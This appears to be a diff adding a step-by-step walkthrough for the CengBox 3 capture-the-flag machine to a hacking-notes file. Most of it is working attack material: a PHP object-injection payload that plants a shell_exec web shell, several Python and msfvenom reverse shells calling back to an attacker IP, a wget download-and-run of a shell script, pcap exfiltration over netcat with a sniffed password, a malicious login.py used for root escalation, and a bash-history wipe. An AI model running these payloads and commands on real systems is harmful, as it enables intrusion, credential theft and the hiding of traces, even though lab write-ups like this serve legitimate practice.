@@ -444,7 +444,7 @@ daemon@linux:/opt/bitnami/apps/wordpress/htdocs$  python3 -c 'import pty;pty.spa
 
 
 9 - in https://crackstation.net/ we cracked our hash:   abcdefghijklmnopqrstuvwxyz
-robot@linux:~$ 
+<robot@linux:~$ 
 
 For this box, the strategy that worked was to locate an executable with suid bit enabled and use it run root-level commands:
 
@@ -801,19 +801,185 @@ $$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
 
 FLAG{3LEV4T0R_P3NT3ST}
 #############################################################################################################################################################
+CENGBOX: 3 
+LEVEL Intermediate
+
+1 - nmap -sn 192.168.43.0/24
+
+2 - nmap -sS -sV -sC -p- 192.168.43.185
+
+3 -  dirb http://192.168.43.185 /usr/share/dirb/wordlists/big.txt  -r
+
+4 - echo -e '192.168.43.185\tceng-company.vm' >> /etc/hosts
+
+5 - gobuster vhost -u http://ceng-company.vm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+
+Found: 	(Status: 200) [Size: 4764]
+Found: www.dev.ceng-company.vm (Status: 200) [Size: 4764]
+
+6 - echo -e '192.168.43.185\tceng-company.vm\tdev.ceng-company.vm ' >> /etc/hosts
+
+7 - in our passive information gathering we found: https://www.reddit.com/user/ElizabethSky_ and  namelastname@ceng-company.vm
+and now 
+    # cewl https://www.reddit.com/user/ElizabethSky_ > ceng-company.vm.txt
+    # username: elizabethsky@ceng-company.vm
+8 - using burbsuite to password attack 
+password is :   walnuttree
+
+9 - after adding poem profile:
+http://dev.ceng-company.vm/addpoem.php?data={we copy this encoded url} and paste it in usr decoder website
+
+O:4:"Poem":3:{s:8:"poemName";s:4:"test";s:10:"isPoetrist";O:8:"poemFile":2:{s:8:"filename";s:22:"/var/www/html/poem.txt";s:8:"poemName";s:4:"test";}s:9:"poemLines";s:6:"mytest";}
+
+9 - php object injection:
+
+O:4:"Poem":3:{s:8:"poemName";s:4:"Test";s:10:"isPoetrist";O:8:"poemFile":2:{s:8:"filename";s:22:"/var/www/html/poem.php";s:8:"poemName";s:47:"<?php echo shell_exec($_GET['cmd'].' 2>&1'); ?>";}s:9:"poemLines";s:6:"MyTest";}
+
+after decode:
+
+O%3A4%3A%22Poem%22%3A3%3A%7Bs%3A8%3A%22poemName%22%3Bs%3A4%3A%22Test%22%3Bs%3A10%3A%22isPoetrist%22%3BO%3A8%3A%22poemFile%22%3A2%3A%7Bs%3A8%3A%22filename%22%3Bs%3A22%3A%22%2Fvar%2Fwww%2Fhtml%2Fpoem.php%22%3Bs%3A8%3A%22poemName%22%3Bs%3A47%3A%22%3C%3Fphp%20echo%20shell_exec%28%24_GET%5B%27cmd%27%5D.%27%202%3E%261%27%29%3B%20%3F%3E%22%3B%7Ds%3A9%3A%22poemLines%22%3Bs%3A6%3A%22MyTest%22%3B%7D
+
+we copy and paste decoded url above in ?data={here} and the we curl http://ceng-company.vm/poem.php?cmd=id
+
+10 - http://ceng-company.vm/poem.php?cmd=which%20python3  
+/usr/bin/python3 
+
+     # nc -nvlp 443
+     # python3 -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.43.214",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+
+-----------
+*** i had some problem with reverse shell so i decided to use another shell: msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh 
+*** this is optional you can do this: 
+$ export TERM=xterm
+$ ^Z
+# stty -a
+# stty raw -echo;fg
+		restart
+$ stty rows 46 columns 209
+$ 
+
+------------
+www-data@cengbox:/var/www/html$ wegt http://192.168.43.214:8090/shell.sh
+www-data@cengbox:/var/www/html$ chmod +x shell.sh
+www-data@cengbox:/var/www/html$ ./shell.sh
+# python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@cengbox:/var/www/html$ 
+
+11 - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite.git
+
+12 - 
+
+www-data@cengbox:/var/www/html$ wget http://192.168.43.214:8090/linpeas.sh 
+www-data@cengbox:/var/www/html$ sh linpeas.sh
+output: 
+[+] Can I sniff with tcpdump?
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sniffing
+You can sniff with tcpdump!
+
+www-data@cengbox:/var/www/html$  cd /tmp 
+www-data@cengbox:/tmp$ tcpdump -i lo -w cengbox.pcapng
+
+# nc -nvlp 12345
+
+www-data@cengbox:/tmp$  nc 192.168.43.214 12345 < cengbox.pcapng
+
+13 - 
+
+# open it with wireshark :
+HTTP/1.1 200 OK ------> follow ----> TCP stream
+
+password=3ricThompson%2ACovid19&username=ericHTTP/1.1 200 OK
+
+3ricThompson*Covid19
+password and username found:
+
+www-data@cengbox:/tmp$ su eric
+password: 3ricThompson%2ACovid19
+
+eric@cengbox:~$ cat user.txt
+If someone asks us when we die tomorrow: ‘What have you seen in the world? If he said, we probably cannot find the answer to give. We don't have time to see it from running. -- Sabahattin Ali
+
+flag(6744e509eec439570c2d6df947526749)
+
+$  ls -la
+
+$  cd /opt/ 
+
+$  vim login.py and put python reverse shell
+
+eric@cengbox:~$ chmod +x linpeas.sh
+eric@cengbox:~$ ./linpeas.sh
+eric@cengbox:~$ cd /opt
+
+eric@cengbox:/opt$ echo 'import socket' > login.py
+
+eric@cengbox:/opt$ echo 'import subprocess' >> login.py
+
+eric@cengbox:/opt$ echo import os >> login.py
+
+eric@cengbox:/opt$ echo 's = socket.socket(socket.AF_INET, socket.SOCK_STREAM)' >> login.py
+
+eric@cengbox:/opt$ echo 's.connect(("192.168.43.214",4444))' >> login.py
+
+eric@cengbox:/opt$ echo 'os.dup2(s.fileno(), 0)' >> login.py
+
+eric@cengbox:/opt$ echo 'os.dup2(s.fileno(), 1)' >> login.py
+
+eric@cengbox:/opt$ echo 'os.dup2(s.fileno(), 2)' >> login.py
+
+eric@cengbox:/opt$ echo 'p=subprocess.call(["/bin/bash", "-i"])' >> login.py
 
 
+7 - nc -nvlp 4444
+
+listening on [any] 4444 ...
+nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.43.214] from (UNKNOWN) [192.168.43.185] 56944
+bash: cannot set terminal process group (5963): Inappropriate ioctl for device
+bash: no job control in this shell
+root@cengbox:~# 
+
+cat proof.txt
+############################################################# 
+###################################################   ####### 
+###############################################   /~\   #####
+############################################   _- `~~~', ####
+##########################################  _-~       )  ####
+#######################################  _-~          |  ####
+####################################  _-~            ;  #####
+##########################  __---___-~              |   #####
+#######################   _~   ,,                  ;  `,,  ##
+#####################  _-~    ;'                  |  ,'  ; ##
+###################  _~      '                    `~'   ; ###
+############   __---;                                 ,' ####
+########   __~~  ___                                ,' ######
+#####  _-~~   -~~ _                               ,' ########
+##### `-_         _                              ; ##########
+#######  ~~----~~~   ;                          ; ###########
+#########  /          ;                        ; ############
+#######  /             ;                      ; #############
+#####  /                `                    ; ##############
+###  /                                      ; ###############
+#                                            ################
+
+The beginning and end of my life were clear; at least I shouldn't have missed the middle. -- Oguz Atay
+
+Good job! You just rooted CengBox 3 successfully. Hope you enjoyed it.
+
+If you did, take a screenshot and share it with me on Twitter - @arslanblcn_
+
+flag(058004ef45a08082100802d41fdcc290)
 
 
+14 - clear everything:
 
+#  cat /dev/null > ~/.bash_history && history -c
 
+$  cat /dev/null > ~/.bash_history && history -c
 
-
-
-
-
-
-
+END
+###############################################################################################################################################################
 
 
 
